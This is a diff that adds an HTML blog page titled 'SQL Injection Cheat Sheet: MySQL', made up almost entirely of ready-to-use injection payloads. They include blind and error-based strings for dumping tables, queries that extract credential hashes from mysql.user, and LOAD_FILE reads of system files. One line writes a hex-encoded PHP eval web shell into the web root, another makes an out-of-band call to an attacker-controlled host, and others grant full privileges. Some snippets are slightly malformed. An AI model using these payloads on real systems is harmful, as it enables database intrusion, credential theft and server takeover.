@@ -1,0 +1,286 @@
+<!doctype html>
+<html class="theme-next muse use-motion" lang="default">
+
+<head>
+    <title> SQL Injection Cheat Sheet: MySQL |Xsi </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+    </div>
+    <h1 class="post-title" itemprop="name headline">SQL Injection Cheat Sheet: MySQL  </h1>
+
+
+    <div class="post-body" itemprop="articleBody">
+
+        <h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td>
+                    <td class="code"><pre><span class="line">#</span><br><span class="line">/*</span><br><span class="line">-- -</span><br><span class="line">;%00</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT VERSION();</span><br><span class="line">SELECT @@VERSION;</span><br><span class="line">SELECT @@GLOBAL.VERSION;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="User-details"><a href="#User-details" class="headerlink" title="User details"></a>User details</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT user()</span><br><span class="line">SELECT current_user()</span><br><span class="line">SELECT system_user()</span><br><span class="line">SELECT session_user()</span><br><span class="line">SELECT user,password FROM mysql.user;   # list Users</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <a id="more"></a>
+        <h3 id="Database-details"><a href="#Database-details" class="headerlink" title="Database details"></a>Database details</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT db_name();</span><br><span class="line">SELECT database();</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Database-credentials"><a href="#Database-credentials" class="headerlink" title="Database credentials"></a>Database credentials</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT host, user, password FROM mysql.user;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Server-details"><a href="#Server-details" class="headerlink" title="Server details"></a>Server details</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT @@hostname;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Table-Name"><a href="#Table-Name" class="headerlink" title="Table Name"></a>Table Name</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables;</span><br><span class="line">SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;;</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #all tables</span><br><span class="line">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;; #Blind</span><br><span class="line">and 0&lt;(select count(*) from xxx) and 1&lt;2    #盲注爆表</span><br><span class="line"></span><br><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))</span><br><span class="line">(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);</span><br><span class="line">AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Find-Tables-From-Column-Name"><a href="#Find-Tables-From-Column-Name" class="headerlink" title="Find Tables From Column Name"></a>Find Tables From Column Name</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &apos;columnname&apos;;#find table which have a column called &apos;columnname&apos;</span><br><span class="line">and 0&lt;(select count(xxx) from tbl_user) and 1&lt;2 ＃盲注爆字段</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Columns-Names"><a href="#Columns-Names" class="headerlink" title="Columns Names"></a>Columns Names</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name = &apos;tablename&apos;;</span><br><span class="line">SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Bitwise-AND"><a href="#Bitwise-AND" class="headerlink" title="Bitwise AND"></a>Bitwise AND</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT 6 &amp; 2; # returns 2</span><br><span class="line">SELECT 6 &amp; 1; # returns 0</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="No-Quotes"><a href="#No-Quotes" class="headerlink" title="No Quotes"></a>No Quotes</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">CONCAT(CHAR(97), CHAR(98), CHAR(99))</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="String-Concatenation"><a href="#String-Concatenation" class="headerlink" title="String Concatenation"></a>String Concatenation</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">CONCAT(foo, bar)</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="If-Statement"><a href="#If-Statement" class="headerlink" title="If Statement"></a>If Statement</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT if(1=1,&apos;foo&apos;,&apos;bar&apos;); — returns &apos;foo&apos;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Avoiding-Quotes"><a href="#Avoiding-Quotes" class="headerlink" title="Avoiding Quotes"></a>Avoiding Quotes</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT 0×414243; # returns ABC</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Case-Statement"><a href="#Case-Statement" class="headerlink" title="Case Statement"></a>Case Statement</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT CASE WHEN (1=1) THEN &apos;A&apos; ELSE &apos;B&apos; END; # returns A</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Conditionals"><a href="#Conditionals" class="headerlink" title="Conditionals"></a>Conditionals</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT IF(1=1,&apos;true&apos;,&apos;false&apos;);</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Time-delay"><a href="#Time-delay" class="headerlink" title="Time-delay"></a>Time-delay</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT BENCHMARK(1000000,MD5(‘A’));</span><br><span class="line">SELECT SLEEP(5); # &gt;= 5.0.12</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">http://dev.mysql.com/doc/refman/5.1/en/adding-udf.html</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="RunAs"><a href="#RunAs" class="headerlink" title="RunAs"></a>RunAs</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">N/A</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Read-Files"><a href="#Read-Files" class="headerlink" title="Read Files"></a>Read Files</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT LOAD_FILE(&apos;C:Windowswin.ini&apos;);</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Outfile-Files-to-www"><a href="#Outfile-Files-to-www" class="headerlink" title="Outfile Files to www"></a>Outfile Files to www</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">select 0x3C3F706870206576616C28245F504F53545B7A5D293B3F3E into outfile &apos;/usr/local/var/www/webshell.php&apos; #&lt;?php eval($_POST[z]);?&gt;&quot;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Out-of-Band-Retrieval"><a href="#Out-of-Band-Retrieval" class="headerlink" title="Out-of-Band Retrieval"></a>Out-of-Band Retrieval</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT LOAD_FILE(concat(&apos;\\&apos;,(SELECT 1), &apos;attacker.controlledserver.com\&apos;)));</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Substrings"><a href="#Substrings" class="headerlink" title="Substrings"></a>Substrings</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT substr(&apos;Foobr&apos;, 1, 1);</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Retrieve-Nth-Line"><a href="#Retrieve-Nth-Line" class="headerlink" title="Retrieve Nth Line"></a>Retrieve Nth Line</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT * FROM table ORDER BY ID LIMIT 3,1</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Select-Nth-Row"><a href="#Select-Nth-Row" class="headerlink" title="Select Nth Row"></a>Select Nth Row</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name = &apos;tablename&apos; limit 1 offset 1    #bypass limit 1,1</span><br><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name = &apos;tablename&apos; limit 1 offset 2</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="List-Privileges"><a href="#List-Privileges" class="headerlink" title="List Privileges"></a>List Privileges</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <ul>
+            <li>— list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; </li>
+            <li>— priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; </li>
+            <li>— list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; </li>
+            <li>— list privs on columns</li>
+        </ul>
+        <h3 id="List-DBA-Accounts"><a href="#List-DBA-Accounts" class="headerlink" title="List DBA Accounts"></a>List DBA Accounts</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td>
+                    <td class="code"><pre><span class="line">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &apos;SUPER&apos;;</span><br><span class="line">SELECT host, user FROM mysql.user WHERE Super_priv = &apos;Y&apos;; # priv</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Delete-Users"><a href="#Delete-Users" class="headerlink" title="Delete Users"></a>Delete Users</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">DROP USER test1;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+        <h3 id="Make-User-DBA"><a href="#Make-User-DBA" class="headerlink" title="Make User DBA"></a>Make User DBA</h3>
+        <figure class="highlight plain">
+            <table>
+                <tr>
+                    <td class="gutter"><pre><span class="line">1</span><br></pre></td>
+                    <td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO test@&apos;%&apos;;</span><br></pre></td>
+                </tr>
+            </table>
+        </figure>
+
+</body>
+</html>
